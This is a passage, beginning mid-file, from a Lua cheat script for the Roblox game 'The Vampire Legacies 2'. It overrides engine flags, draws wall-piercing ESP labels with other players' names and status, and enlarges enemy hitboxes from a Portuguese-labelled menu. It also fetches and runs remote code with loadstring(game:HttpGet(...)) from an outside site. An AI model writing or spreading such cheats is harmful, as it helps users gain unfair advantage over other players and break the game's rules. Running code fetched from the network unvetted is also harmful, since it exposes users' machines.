				["DFIntPerformanceControlTextureQualityBestUtility"] = "-1",
				["DFIntRakNetMtuValue3InBytes"] = "1200",
				["FFlagDebugSkyGray"] = "True",
				["DFIntRakNetMtuValue2InBytes"] = "1240",
				["FFlagDebugDisableOTAMaterialTexture"] = "True",
				["DFIntAnimationLodFacsFpsMax"] = "0",
				["DFIntAnimationLodFacsFpsMin"] = "0",
				["DFIntAnimationLodFacsVisibilityMax"] = "0",
				["DFIntAnimationLodFacsVisibilityMin"] = "0",
				["FFlagAvatarChatIncludeSelfViewOnTelemetry"] = "False",
				["FFlagCoreGuiSelfViewVisibilityFixed"] = "False",
				["FFlagDebugSelfViewPerfBenchmark"] = "False",
				["FFlagDisableChromeV3StaticSelfView"] = "False",
				["FFlagFixSelfViewPopin"] = "False",
				["FFlagInExperienceUpsellSelfViewFix"] = "False",
				["FFlagMockOpenSelfViewForCameraUser"] = "False",
				["FFlagSelfViewAvoidErrorOnWrongFaceControlsParenting"] = "False",
				["FFlagSelfViewCameraDefaultButtonInViewPort"] = "False",
				["FFlagSelfViewFixes"] = "False",
				["FFlagSelfViewGetRidOfFalselyRenderedFaceDecal"] = "False",
				["FFlagSelfViewHumanoidNilCheck"] = "False",
				["FFlagSelfViewLookUpHumanoidByType"] = "False",
				["FFlagSelfViewMoreNilChecks"] = "False",
				["FFlagSelfViewRemoveVPFWhenClosed"] = "False",
				["FFlagSelfViewTweaksPass"] = "False",
				["FFlagSelfViewUpdatedCamFraming"] = "False",
				["FIntSelfViewTooltipLifetime"] = "0",
				["DFIntAnimationFromVideoCreatorStudioServiceSecondsPerRequest"] = "0",
				["DFIntAnimationLodBoneLocomotionFixMaxDepth"] = "0",
				["DFIntAnimationLodBudgetAdjustmentMaxInThousandths"] = "0",
				["DFIntAnimationLodBudgetAdjustmentMinInThousandths"] = "0",
				["DFIntAnimationLodCleanupIntervalSeconds"] = "0",
				["DFIntAnimationLodConfigVersion"] = "0",
				["DFIntAnimationLodDerivativeGainThousandths"] = "0",
				["DFIntAnimationLodDistanceMaxLod0"] = "0",
				["DFIntAnimationLodDistanceMaxLod1"] = "0",
				["DFIntAnimationLodFacsAnimationTimeMsMax"] = "0",
				["DFIntAnimationLodFacsAnimationTimeMsMin"] = "0",
				["DFIntAnimationLodFacsMaxLodThreshold"] = "0",
				["DFIntAnimationLodFacsOutOfFrustumLodPercentage"] = "0",
				["DFIntAnimationLodIntegralGainThousandths"] = "0",
				["DFIntAnimationLodInverseVisibilityMinLod0"] = "0",
				["DFIntAnimationLodInverseVisibilityMinLod1"] = "0",
				["DFIntAnimationLodOutsideFrustumDistanceMaxLod0"] = "0",
				["DFIntAnimationLodProportionalGainThousandths"] = "0",
				["DFIntAnimationLodRetargetingIkMaxLodThreshold"] = "0",
				["DFIntAnimationLodThrottleMaxFramesToSkip"] = "0",
				["DFIntAnimationLodThrottlerAnimationTimeMsMax"] = "0",
				["DFIntAnimationLodThrottlerAnimationTimeMsMin"] = "0",
				["DFIntAnimationLodThrottlerDistanceMax"] = "0",
				["DFIntAnimationLodThrottlerDistanceMin"] = "0",
				["DFIntAnimationLodThrottlerFpsMax"] = "0",
				["DFIntAnimationLodThrottlerFpsMin"] = "0",
				["DFIntAnimationLodThrottlerOutOfFrustumLodPercentage"] = "0",
				["DFIntAnimationLodThrottlerVisibilityDenominator"] = "0",
				["DFIntAnimationLodThrottlerVisibilityMax"] = "0",
				["DFIntAnimationLodThrottlerVisibilityMin"] = "0",
				["DFIntAnimationParallelFpsLossFactor100th"] = "0",
				["DFIntAnimationParallelTimeBudgetUs"] = "0",
				["DFIntAnimationRateLimiterAssertAmount"] = "0",
				["DFIntAnimationRateLimiterMaxAmount"] = "0",
				["DFIntAnimationRateLimiterSeconds"] = "0",
				["DFIntAnimationScaleDampeningPercent"] = "0",
				["DFIntAnimationStreamTrackTrace"] = "0",
				["DFIntAnimatorTelemetryCollectionRate"] = "0",
				["DFIntAnimatorThrottleMaxFramesToSkip"] = "1",
				["DFIntAnimatorThrottleRccFramesToSkip"] = "999999999",
				["FIntDynamicHeadBorderSize"] = "0",
				["FFlagUGCValidateMoveDynamicHeadTest3"] = "False",
				["FFlagUGCValidateDynamicHeadMoodClient"] = "False",
				["FFlagUGCValidateDynamicHeadMoodClientVpfSnapshot"] = "False",
				["FFlagUGCValidateDynamicHeadMoodRCC"] = "False",
				["DFFlagUseDefaultDynamicHead2"] = "False",
				["FFlagDisableHSRForDynamicHead"] = "True",
				["DFFlagReduceFacialAnimationsWhenFacsStreaming"] = "False",
				["DFFlagReduceFacialAnimationsWhenFacsStreaming2"] = "False",
				["FFlagFacialAnimation1BetaFeature"] = "False",
				["FFlagFacialAnimationRecordingBetaFeature"] = "False",
				["FFlagFacialAnimationRecordingInStudio"] = "False",
				["FFlagFacialAnimationStreamingCheckPauseStateAfterEmote2"] = "False",
				["FFlagFacialAnimationStreamingClearAllConnectionsFix2"] = "False",
				["FFlagFacialAnimationStreamingClearTrackImprovementsV2"] = "False",
				["FFlagFacialAnimationStreamingIfNoDynamicHeadDisableA2C"] = "False",
				["FFlagFacialAnimationStreamingRcc"] = "False",
				["FFlagFacialAnimationStreamingSearchForReplacementWhenRemovingAnimator"] = "False",
				["FFlagFacialAnimationStreamingServiceUniverseSettingsEnableAudio"] = "False",
				["FFlagFacialAnimationStreamingServiceUniverseSettingsEnableVideo"] = "False",
				["FFlagFacialAnimationStreamingServiceUniverseSettingsMock"] = "False",
				["FFlagFacialAnimationStreamingServiceUserSettingsCache"] = "False",
				["FFlagFacialAnimationStreamingServiceUserSettingsMock"] = "False",
				["FFlagFacialAnimationStreamingServiceUserSettingsOptInAudio"] = "False",
				["FFlagFacialAnimationStreamingServiceUserSettingsOptInVideo"] = "False",
				["FFlagFacialAnimationStreamingServiceUseServerThrottling"] = "False",
				["FFlagFacialAnimationStreamingUseEnableFlags2"] = "False",
				["FFlagFacialAnimationStreamingValidateAnimatorBeforeRemoving"] = "False",
				["SFFlagFacialAnimation1BetaFeatureRoleSet"] = "False",
				["SFFlagFacialAnimation1BetaFeatureRolloutPercent"] = "False",
				["SFFlagFacialAnimationRecordingBetaFeatureRoleSet"] = "False",
				["SFFlagFacialAnimationRecordingBetaFeatureRolloutPercent"] = "False",
				["SFFlagFacialAnimationStreamRccThrottleServerCount"] = "False",
				["SFFlagReduceFacialAnimationsAudioVideoMode"] = "False",
				["FFlagDebugDeterministicParticles"] = "False",
				["FFlagFixOutdatedParticles"] = "False",
				["FFlagFixOutdatedTimeScaleParticles"] = "False",
				["FFlagFixParticleAttachmentCulling"] = "False",
				["FFlagFixParticleEmissionBias"] = "False",
				["DFIntPerformanceControlFrameTimeMax"] = "1",
				["DFIntPerformanceControlFrameTimeMaxUtility"] = "-1",
				["DFIntBufferCompressionLevel"] = "0",
				["FFlagSimEnableDCD10"] = "True",
				["FFlagPushFrameTimeToHarmony"] = "True",
				["FFlagUISUseLastFrameTimeInUpdateInputSignal"] = "True",
				["DFIntNumFramesAllowedToBeAboveError"] = "1",
				["DFIntVisibilityCheckRayCastLimitPerFrame"] = "10",
				["DFIntTimeBetweenSendConnectionAttemptsMS"] = "200",
				["DFFlagPerformanceControlEnableInference"] = "True",
				["DFFlagPerformanceControlEnableMemoryProbing"] = "True",
				["DFFlagPerformanceControlIXPMemoryBufferConstantCheck"] = "True",
				["DFIntDebugPerformanceControlUsedMemoryMB"] = "1",
				["DFIntPerformanceControlIXPBestQueueSize"] = "1",
				["DFIntPerformanceControlIXPQueueSizeBestUtility"] = "1",
				["DFIntPerformanceControlIXPQueueSizeUtilityExponentTenThousandths"] = "1",
				["DFIntPerformanceControlPredictedOOMAbsLimitExtraBufferMB"] = "1",
				["DFIntPerformanceControlSoundReloadLatencyMaxValue"] = "1",
				["DFIntPerformanceControlSoundReloadLatencyMinValue"] = "1",
				["DFIntPerformanceControlSoundReloadLatencyTargetUtility"] = "1",
				["FFlagDebugGraphicsPreferOpenGL"] = "True",
				["DFIntDebugRestrictGCDistance"] = "1",
				["FFlagDebugGraphicsPreferD3D11FL10"] = "True",
				["FFlagRenderPerformanceTelemetry"] = "False",
				["FIntRenderLocalLightFadeInMs_enabled"] = "99999",
				["FFlagEnableReportAbuseMenuRoact2"] = "false",
				["FIntReportDeviceInfoRollout"] = "0",
				["FFlagEnableFavoriteButtonForUgc"] = "true",
				["FFlagEnableReportAbuseMenuRoactABTest2"] = "False",
				["FFlagEnableBubbleChatFromChatService"] = "False",
				["FFlagEnableReportAbuseMenuLayerOnV3"] = "false",
				["DFFlagESGamePerfMonitorEnabled"] = "False",
				["FIntStartupInfluxHundredthsPercentage"] = "0",
				["FFlagEnableBetaBadgeLearnMore"] = "false",
				["FFlagEnableInGameMenuChromeABTest2"] = "False",
				["FFlagEnableBubbleChatConfigurationV2"] = "False",
				["FFlagEnableNewInviteMenuIXP2"] = "False",
				["FFlagGlobalWindRendering"] = "false",
				["FFlagUserPreventOldBubbleChatOverlap"] = "False",
				["FFlagRenderCheckThreading"] = "True",
				["FFlagBetaBadgeLearnMoreLinkFormview"] = "false",
				["FFlagGraphicsSettingsOnlyShowValidModes"] = "True",
				["FFlagPreloadMinimalFonts"] = "True",
				["FFlagNullCheckCloudsRendering"] = "True",
				["FFlagGameBasicSettingsFramerateCap"] = "True",
				["FIntCameraMaxZoomDistance"] = "99999",
				["FFlagControlBetaBadgeWithGuac"] = "false",
				["FStringVoiceBetaBadgeLearnMoreLink"] = "null",
				["FIntRenderLocalLightFadeInMs"] = "0",
				["DFIntCullFactorPixelThresholdShadowMapHighQuality"] = "2147483647",
				["DFIntCullFactorPixelThresholdShadowMapLowQuality"] = "2147483647",
				["FFlagRenderNoLowFrmBloom"] = "False",
				["FIntGrassMovementReducedMotionFactor"] = "0",
				["DFIntTextureCompositorActiveJobs"] = "0",
				["DFFlagUseVisBugChecks"] = "False",
				["FFlagEnableVisBugChecks27"] = "False",
				["FFlagVisBugChecksThreadYield"] = "False",
				["FIntEnableVisBugChecksHundredthPercent27"] = "0",
				["FIntDebugTextureManagerSkipMips"] = "2",
				["FFlagAlwaysShowVRToggleV3"] = "False",
				["FFlagAssetPreloadingIXP"] = "True",
				["FFlagLuaAppLegacyInputSettingRefactor"] = "True",
				["FFlagQuaternionPoseCorrection"] = "True",
				["DFFlagEnableTexturePreloading"] = "True",
				["FFlagEnableInGameMenuDurationLogger"] = "False",
				["FIntRenderMaxShadowAtlasUsageBeforeDownscale"] = "0",
				["FFlagRenderLegacyShadowsQualityRefactor"] = "True",
				["FFlagVideoReportHardwareBufferMetrics"] = "True",
				["FFlagEnableAudioPannerFiltering"] = "True",
				["DFFlagAudioUseVolumetricPanning"] = "True",
				["FIntUnifiedLightingBlendZone"] = "0",
				["FIntDirectionalAttenuationMaxPoints"] = "0",
				["FFlagVideoServiceAddHardwareCodecMetrics"] = "True",
				["FIntRenderMeshOptimizeVertexBuffer"] = "1",
				["FFlagSimEnableDCD16"] = "True",
				["FFlagImproveShiftLockTransition"] = "True",
				["DFIntAssetPreloading"] = "2147483647",
				["FFlagContentProviderPreloadHangTelemetry"] = "False",
				["DFFlagAudioEnableVolumetricPanningForPolys"] = "True",
				["FIntDebugFRMOptionalMSAALevelOverride"] = "0",
				["FIntSSAOMipLevels"] = "0",
				["FFlagDebugForceGenerateHSR"] = "True",
				["FIntUITextureMaxUpdateDepth"] = "1",
				["DFFlagTeleportClientAssetPreloadingDoingExperiment2"] = "True",
				["DFFlagEnableSoundPreloading"] = "True",
				["FFlagDebugEnableDirectAudioOcclusion2"] = "True",
				["FStringDebugLuaLogLevel"] = "trace",
				["DFFlagEnableMeshPreloading2"] = "True",
				["DFFlagTeleportClientAssetPreloadingEnabledIXP"] = "True",
				["FStringDebugLuaLogPattern"] = "ExpChat/mountClientApp",
				["FFlagRenderDynamicResolutionScale7"] = "True",
				["FFlagUserShowGuiHideToggles"] = "True",
				["DFIntNumAssetsMaxToPreload"] = "2147483647",
				["DFFlagSimOptimizeSetSize"] = "True",
				["FFlagChatTranslationEnableSystemMessage"] = "False",
				["DFFlagTeleportClientAssetPreloadingEnabledIXP2"] = "True",
				["DFFlagTeleportPreloadingMetrics5"] = "True",
				["FFlagMessageBusCallOptimization"] = "True",
				["FFlagDebugSSAOForce"] = "False",
				["FFlagDebugForceFSMCPULightCulling"] = "True",
				["DFFlagDebugSkipMeshVoxelizer"] = "True",
				["DFFlagAudioEnableVolumetricPanningForMeshes"] = "True",
				["FIntVertexSmoothingGroupTolerance"] = "0",
				["FFlagDisableFeedbackSoothsayerCheck"] = "False",
				["DFIntHACDPointSampleDistApartTenths"] = "2147483647",
				["DFFlagTeleportClientAssetPreloadingEnabled9"] = "True",
				["FFlagAddHapticsToggle"] = "False",
				["FFlagUserSoundsUseRelativeVelocity2"] = "True",
				["DFFlagTeleportClientAssetPreloadingDoingExperiment"] = "True",
				["FFlagHighPrecisionHitBox"] = "True",
				["FFlagFastHitDetection"] = "True",
				["FFlagSmoothHitreg"] = "True",
				["FFlagLowLatencyHitreg"] = "True",
				["FFlagOptimizeHitreg"] = "True",
				["FFlagAccurateHitbox"] = "True",
				["DFIntNetPrioritizeHitRegPackets"] = "2147483647",
				["DFIntHitRegLatencyComp"] = "2147483647",
				["DFIntNetPrioHitRegHighPingBoost"] = "2147483647",
				["DFIntNetCompHitRegBuffer"] = "2147483647",
				["DFIntDataSenderMaxBandwidthBps"] = "2147483647",
				["FFlagDynamicHitbox"] = "True",
				["FFlagEnhanceHitdetection"] = "True",
				["DFIntPhysHitRegSyncRate"] = "2147483647"
			}

			for flag, val in pairs(fflags) do
				pcall(function() setfflag(flag, val) end)
			end
		end

		-- Standard Lua Optimizations
		local lighting = game:GetService("Lighting")
		lighting.GlobalShadows = false
		lighting.FogEnd = 9e9
		lighting.Brightness = 1
		
		settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
		
		for _, v in ipairs(game:GetDescendants()) do
			if v:IsA("BasePart") then
				v.CastShadow = false
			elseif v:IsA("Decal") or v:IsA("Texture") then
				v.Transparency = 1
			elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
				v.Enabled = false
			elseif v:IsA("MeshPart") then
				v.RenderFidelity = Enum.RenderFidelity.Performance
			end
		end
	end

	local function generateColorFromText(text)
		local hash = 0
		for i = 1, #text do
			hash += string.byte(text, i) * i
		end
		return Color3.fromRGB((hash * 123) % 255, (hash * 321) % 255, (hash * 213) % 255)
	end

	local function getSpecieColor(specie)
		return SPECIE_COLORS[specie] or generateColorFromText(specie or "Unknown")
	end

	local function formatCharacterName(name)
		if not name then
			return "Unknown"
		end
		return string.gsub(name, "(%l)(%u)", "%1 %2")
	end

	local function isInLimbo(player)
		return playersInLimbo[player] == true
	end

	local function removeESP(playerName)
		if espObjects[playerName] then
			espObjects[playerName]:Destroy()
			espObjects[playerName] = nil
		end
	end

	local function createText(parent, text, size, color, order, bold)
		local label = Instance.new("TextLabel")
		label.Size = UDim2.new(1, 0, 0, size + 4)
		label.BackgroundTransparency = 1
		label.Text = text
		label.TextColor3 = color
		label.TextSize = size
		label.Font = bold and Enum.Font.GothamBold or Enum.Font.Gotham
		label.TextStrokeTransparency = ESP_SETTINGS.StrokeTransparency
		label.TextStrokeColor3 = ESP_SETTINGS.StrokeColor
		label.LayoutOrder = order
		label.Parent = parent
		return label
	end

	local function createESP(character, player)
		if not espEnabled or not character or player == LocalPlayer then
			return
		end

		local hrp = character:FindFirstChild("HumanoidRootPart")
		local myHrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
		if not hrp or not myHrp then
			removeESP(player.Name)
			return
		end
		if (hrp.Position - myHrp.Position).Magnitude > espRange then
			removeESP(player.Name)
			return
		end

		local characterName = player:GetAttribute("CharacterName")
		local specieType = character:GetAttribute("SpecieType") or "Unknown"
		local specieColor = getSpecieColor(specieType)
		local inLimbo = isInLimbo(player)

		local existing = espObjects[player.Name]
		if existing and existing.Parent then
			existing.Adornee = hrp
			return
		end

		local billboard = Instance.new("BillboardGui")
		billboard.Name = "ModernESP"
		billboard.Size = UDim2.new(0, 220, 0, inLimbo and 80 or 60)
		billboard.StudsOffset = Vector3.new(0, ESP_SETTINGS.HeightOffset, 0)
		billboard.AlwaysOnTop = true
		billboard.Adornee = hrp

		local container = Instance.new("Frame")
		container.Size = UDim2.new(1, 0, 1, 0)
		container.BackgroundTransparency = 1
		container.Parent = billboard

		local layout = Instance.new("UIListLayout")
		layout.VerticalAlignment = Enum.VerticalAlignment.Center
		layout.SortOrder = Enum.SortOrder.LayoutOrder
		layout.Padding = UDim.new(0, 1)
		layout.Parent = container

		if inLimbo then
			createText(container, "[DEAD] - Other Side", ESP_SETTINGS.DeadSize, ESP_SETTINGS.DeadColor, 0, true)
		end
		createText(container, formatCharacterName(characterName), ESP_SETTINGS.TextSize, ESP_SETTINGS.TextColor, 1, true)
		createText(container, specieType, ESP_SETTINGS.SpecieSize, specieColor, 2, true)
		createText(container, player.Name, ESP_SETTINGS.UsernameSize, ESP_SETTINGS.UsernameColor, 3, false)

		billboard.Parent = CoreGui
		espObjects[player.Name] = billboard
	end

	local function refreshESPAll()
		for _, player in ipairs(Players:GetPlayers()) do
			if player ~= LocalPlayer and player.Character then
				createESP(player.Character, player)
			end
		end
	end

	local function clearAllESP()
		for name in pairs(espObjects) do
			removeESP(name)
		end
	end

	local function setESPEnabled(state)
		espEnabled = state
		if espEnabled then
			refreshESPAll()
		else
			clearAllESP()
		end
	end

	local function setupESPPlayer(player)
		if player == LocalPlayer then
			return
		end
		player.CharacterAdded:Connect(function(character)
			task.wait(0.1)
			if espEnabled then
				createESP(character, player)
			end
		end)
	end



	local function resolveKeyCode(value)
		if typeof(value) == "EnumItem" and value.EnumType == Enum.KeyCode then
			return value
		end
		if type(value) == "string" then
			-- Try exact match
			local s, r = pcall(function() return Enum.KeyCode[value] end)
			if s and r then return r end
			
			-- Try capitalized (e.g. "four" -> "Four")
			local normalized = string.upper(string.sub(value, 1, 1)) .. string.lower(string.sub(value, 2))
			local s2, r2 = pcall(function() return Enum.KeyCode[normalized] end)
			if s2 and r2 then return r2 end

			-- Try uppercase
			local upper = string.upper(value)
			local s3, r3 = pcall(function() return Enum.KeyCode[upper] end)
			if s3 and r3 then return r3 end
		end
		if type(value) == "table" then
			if value.KeyCode and typeof(value.KeyCode) == "EnumItem" then return value.KeyCode end
			if value.Value and typeof(value.Value) == "EnumItem" then return value.Value end
		end
		return Enum.KeyCode.Four
	end

	-- ==================== LOADER ====================

	syde:Load({
		Name = "diarian",
		Logo = "88732649582723",
		Status = "Stable",
		ConfigurationSaving = {
			Enabled = true,
			FolderName = "diarian_ui_only",
			FileName = "config",
		},
	})

	local Starlight = loadstring(game:HttpGet("https://raw.nebulasoftworks.xyz/starlight"))()
	local NebulaIcons = loadstring(game:HttpGet("https://raw.nebulasoftworks.xyz/nebula-icon-library-loader"))()

	local Window = Starlight:CreateWindow({
		Name = "diarian",
		Subtitle = "The Vampire Legacies 2",
		LoadingEnabled = false,
		BuildWarnings = false,
		InterfaceAdvertisingPrompts = false,
		NotifyOnCallbackError = true,
		ConfigurationSettings = {
			Enabled = false,
		},
		Discord = {
			Enabled = false,
		},
	})

	local MainSection = Window:CreateTabSection("Main")
	local HitboxTab = MainSection:CreateTab({
		Name = "Hitbox",
		Columns = 2,
		Icon = NebulaIcons:GetIcon("crosshair", "Lucide"),
	}, "hitbox_tab")
	local VisualsTab = MainSection:CreateTab({
		Name = "Visuals",
		Columns = 1,
		Icon = NebulaIcons:GetIcon("eye", "Lucide"),
	}, "visuals_tab")
	local MiscTab = MainSection:CreateTab({
		Name = "Misc",
		Columns = 1,
		Icon = NebulaIcons:GetIcon("settings", "Lucide"),
	}, "misc_tab")

	local HitboxMainGroup = HitboxTab:CreateGroupbox({ Name = "Hitbox", Column = 1 }, "hitbox_main_group")
	local HitboxWhitelistGroup = HitboxTab:CreateGroupbox({ Name = "Whitelist", Column = 2 }, "hitbox_whitelist_group")
	local VisualsGroup = VisualsTab:CreateGroupbox({ Name = "ESP", Column = 1 }, "visuals_group")
	local MiscGroup = MiscTab:CreateGroupbox({ Name = "Configurações", Column = 1 }, "misc_group")

	MiscGroup:CreateButton({
		Name = "Ativar FPS Booster",
		Callback = function()
			activateFPSBooster()
			syde:Notify({
				Title = "FPS Booster",
				Content = "Otimizações aplicadas!",
				Duration = 3,
			})
		end,
	}, "fps_booster_btn")

	hitboxToggleRef = HitboxMainGroup:CreateToggle({
		Name = "Ativar Hitbox",
		CurrentValue = hitboxEnabled,
		Callback = function(state)
			setHitboxEnabled(state)
		end,
	}, "hitbox_toggle")

	hitboxToggleRef:AddBind({
		CurrentValue = hitboxKeybind.Name,
		HoldToInteract = false,
		SyncToggleState = true,
		OnChangedCallback = function(key)
			local newKey = resolveKeyCode(key)
			if newKey then
				hitboxKeybind = newKey
			end
		end,
	}, "hitbox_bind")

	HitboxMainGroup:CreateSlider({
		Name = "Tamanho da Box",
		Range = { 10, 65 },
		Increment = 1,
		CurrentValue = 50,
		Callback = function(value)
			hitboxSize = value
			refreshAllHitboxes()
		end,
	}, "hitbox_size")

	HitboxMainGroup:CreateSlider({
		Name = "Transparência da Box",
		Range = { 0, 100 },
		Increment = 1,
		CurrentValue = 80,
		Callback = function(value)
			hitboxTransparency = value
			refreshAllHitboxes()
		end,
	}, "hitbox_transparency")

	HitboxMainGroup:CreateLabel({ Name = "Cor da Hitbox" }, "hitbox_color_label"):AddColorPicker({
		CurrentValue = Color3.fromRGB(180, 150, 255),
		Transparency = 0,
		Callback = function(color)
			hitboxColor = color
			refreshAllHitboxes()
		end,
	}, "hitbox_color")

	local function setWhitelistPlayer(playerName, state)
		if not playerName or playerName == LocalPlayer.Name then
			return
		end

		if state then
			friendWhitelist[playerName] = true
			if EntitiesFolder then
				local entity = EntitiesFolder:FindFirstChild(playerName)
				if entity and entity:IsA("Model") then
					destroyHitboxForModel(entity)
				end
			end
		else
			friendWhitelist[playerName] = nil
			if hitboxEnabled and EntitiesFolder then
				local entity = EntitiesFolder:FindFirstChild(playerName)
				if entity and entity:IsA("Model") then
					createHitboxForModel(entity)
				end
			end
		end

	end

	local function addWhitelistToggleForPlayer(player)
		if not player or player == LocalPlayer then
			return
		end
		if whitelistToggles[player.Name] then
			return
		end

		whitelistToggles[player.Name] = HitboxWhitelistGroup:CreateToggle({
			Name = "Ignorar " .. player.Name,
			CurrentValue = friendWhitelist[player.Name] == true,
			Callback = function(state)
				setWhitelistPlayer(player.Name, state)
			end,
		}, "whitelist_" .. player.Name)
	end
	for _, player in ipairs(Players:GetPlayers()) do
		if player ~= LocalPlayer then
			addWhitelistToggleForPlayer(player)
		end
	end

	Players.PlayerAdded:Connect(function(player)
		addWhitelistToggleForPlayer(player)
	end)

	Players.PlayerRemoving:Connect(function(player)
		if whitelistToggles[player.Name] then
			pcall(function()
				whitelistToggles[player.Name]:Destroy()
			end)
			whitelistToggles[player.Name] = nil
		end
	end)





	VisualsGroup:CreateToggle({
		Name = "Enable ESP",
		CurrentValue = espEnabled,
		Callback = function(state)
			setESPEnabled(state)
		end,
	}, "esp_toggle")

	VisualsGroup:CreateSlider({
		Name = "ESP Update Interval",
		Range = { 0, 5 },
		Increment = 0.1,
		CurrentValue = 1,
		Callback = function(value)
			espUpdateInterval = math.max(0.1, value)
		end,
	}, "esp_interval")

	VisualsGroup:CreateSlider({
		Name = "ESP Range",
		Range = { 100, 2000 },
		Increment = 50,
		CurrentValue = 1000,
		Callback = function(value)
			espRange = value
			if espEnabled then
				refreshESPAll()
			end
		end,
	}, "esp_range")



	if EntitiesFolder then
		EntitiesFolder.ChildAdded:Connect(function(entity)
			if hitboxEnabled and entity:IsA("Model") then
				createHitboxForModel(entity)
			end
		end)

		EntitiesFolder.ChildRemoved:Connect(function(entity)
			destroyHitboxForModel(entity)
		end)
	end

	workspace.ChildAdded:Connect(function(child)
		if child.Name == "Entities" and child:IsA("Folder") then
			EntitiesFolder = child
			if hitboxEnabled then
				for _, entity in ipairs(EntitiesFolder:GetChildren()) do
					if entity:IsA("Model") then
						createHitboxForModel(entity)
					end
				end
			end
		end
	end)

	for _, player in ipairs(CollectionService:GetTagged("InLimbo")) do
		if player:IsA("Player") then
			playersInLimbo[player] = true
		end
	end

	table.insert(espConnections, CollectionService:GetInstanceAddedSignal("InLimbo"):Connect(function(instance)
		if instance:IsA("Player") then
			playersInLimbo[instance] = true
			if espEnabled and instance.Character then
				createESP(instance.Character, instance)
			end
		end
	end))

	table.insert(espConnections, CollectionService:GetInstanceRemovedSignal("InLimbo"):Connect(function(instance)
		if instance:IsA("Player") then
			playersInLimbo[instance] = nil
			if espEnabled and instance.Character then
				createESP(instance.Character, instance)
			end
		end
	end))

	for _, player in ipairs(Players:GetPlayers()) do
		setupESPPlayer(player)
	end

	table.insert(espConnections, Players.PlayerAdded:Connect(setupESPPlayer))

	table.insert(espConnections, Players.PlayerRemoving:Connect(function(player)
		playersInLimbo[player] = nil
		removeESP(player.Name)
	end))

	if not espLoopRunning then
		espLoopRunning = true
		task.spawn(function()
			while espLoopRunning do
				if espEnabled then
					local now = os.clock()
					if now - lastESPUpdate >= espUpdateInterval then
						lastESPUpdate = now
						refreshESPAll()
					end
				end
				task.wait(0.05)
			end
		end)
	end

